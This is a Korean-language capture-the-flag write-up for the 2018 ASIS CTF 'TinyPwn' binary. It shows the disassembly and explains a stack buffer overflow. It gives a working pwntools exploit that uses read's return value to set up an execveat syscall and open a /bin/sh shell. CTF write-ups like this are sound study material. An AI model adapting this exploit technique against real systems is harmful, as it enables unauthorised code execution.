---
title: "2018 ASIS CTF TinyPwn"
date: 2020-1-22
tags: [ASIS]
categories: [ASIS]
---

매우 작은 바이너리다.

```
.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 xor     rbx, rbx
.text:00000000004000B6                 xor     rcx, rcx
.text:00000000004000B9                 xor     rdx, rdx
.text:00000000004000BC                 xor     rdi, rdi
.text:00000000004000BF                 xor     rsi, rsi
.text:00000000004000C2                 xor     r8, r8
.text:00000000004000C5                 xor     r9, r9
.text:00000000004000C8                 xor     r10, r10
.text:00000000004000CB                 xor     r11, r11
.text:00000000004000CE                 xor     r12, r12
.text:00000000004000D1                 xor     r13, r13
.text:00000000004000D4                 xor     r14, r14
.text:00000000004000D7                 xor     r15, r15
.text:00000000004000DA                 xor     rbp, rbp
.text:00000000004000DD                 call    sub_4000F2
.text:00000000004000E2                 mov     eax, 60
.text:00000000004000E7                 xor     rdi, rdi        ; error_code
.text:00000000004000EA                 xor     rsi, rsi
.text:00000000004000ED                 xor     rdx, rdx
.text:00000000004000F0                 syscall                 ; LINUX - sys_exit
.text:00000000004000F0 start           endp
.text:00000000004000F0
.text:00000000004000F2
.text:00000000004000F2 ; =============== S U B R O U T I N E =======================================
.text:00000000004000F2
.text:00000000004000F2
.text:00000000004000F2 sub_4000F2      proc near               ; CODE XREF: start+2D↑p
.text:00000000004000F2                 sub     rsp, 128h
.text:00000000004000F9                 mov     rsi, rsp
.text:00000000004000FC                 mov     edx, 148h
.text:0000000000400101                 syscall                 ; LINUX - sys_exit
.text:0000000000400103                 add     rsp, 128h
.text:000000000040010A                 retn
```

입력받는 버퍼가 0x128인데 0x148만큼 받는다. read가 입력받은 길이를 리턴하는 걸 이용해서 rax 맞춰주고 syscall 322(execveat) 가젯 맞춰주면 된다. rsi에는 우리가 입력한게 들어가니까 `/bin/sh\x00` 넣어주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'
e = ELF('./TinyPwn')
p = process('./TinyPwn')

# read(0,rsp,0x148)
# execveat(0,'/bin/sh\x00',0,0,0)
payload = '/bin/sh\x00' # rsi
payload = payload.ljust(0x128,'A') # dummy
payload += p64(0x00000000004000ED) # xor rdx, rdx ; syscall
payload = payload.ljust(322,'B') # execveat
p.send(payload)

p.interactive()
```

